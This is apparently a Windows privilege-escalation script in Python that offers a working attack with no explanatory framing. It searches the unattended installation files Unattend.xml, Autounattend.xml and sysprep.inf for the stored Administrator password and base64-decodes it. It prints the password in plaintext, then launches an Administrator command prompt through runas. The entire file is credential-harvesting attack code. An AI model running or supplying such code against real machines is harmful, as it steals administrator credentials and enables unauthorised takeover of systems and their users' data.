import os
import re
import base64
import subprocess

# Define file paths to check
file_paths = [
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Autounattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
]

# Regular expression to find the administrator password
password_pattern = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE)

def extract_password(file_path):
    """Extracts administrator password from unattended installation files."""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
            match = password_pattern.search(content)
            if match:
                return match.group(1)
    except Exception as e:
        pass
    return None

# Search for password in the specified files
admin_password = None
for path in file_paths:
    if os.path.exists(path):
        admin_password = extract_password(path)
        if admin_password:
            print(f"[+] Password found in: {path}")
            break

if not admin_password:
    print("[-] No administrator password found.")
    exit(1)

# Decode if the password is base64 encoded
try:
    decoded_password = base64.b64decode(admin_password).decode("utf-8")
    print(f"[+] Decoded Admin Password: {decoded_password}")
except:
    decoded_password = admin_password
    print(f"[+] Plaintext Admin Password: {decoded_password}")

# Start an admin session using 'runas'
command = f'runas /user:Administrator "cmd.exe /K dir C:\\Users\\Administrator\\Desktop"'
try:
    subprocess.run(command, shell=True)
    print("[+] Admin session initiated.")
except Exception as e:
    print(f"[-] Failed to start admin session: {e}")